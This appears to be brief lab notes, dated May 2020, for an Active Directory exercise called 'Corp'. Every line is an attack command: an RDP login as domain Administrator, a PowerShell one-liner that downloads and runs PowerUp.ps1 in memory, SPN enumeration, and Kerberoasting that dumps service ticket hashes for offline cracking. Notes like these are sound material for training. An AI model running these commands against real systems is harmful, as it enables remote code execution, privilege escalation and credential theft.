# Corp

> Nashia Holloway | May 6th, 2020

## RDP

`xfreerdp /u:'corp\Administrator' /v:34.247.253.242`

## Powershell Download Stuff

`iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')`

## Extract SPN Accounts

`setspn -T medin -Q */*`

## Invoke Kerberoast (Output Hashcat)

`Invoke-Kerberoast -OutputFormat hashcat | fl | Out-file -filepath <filepath\hash.txt>`
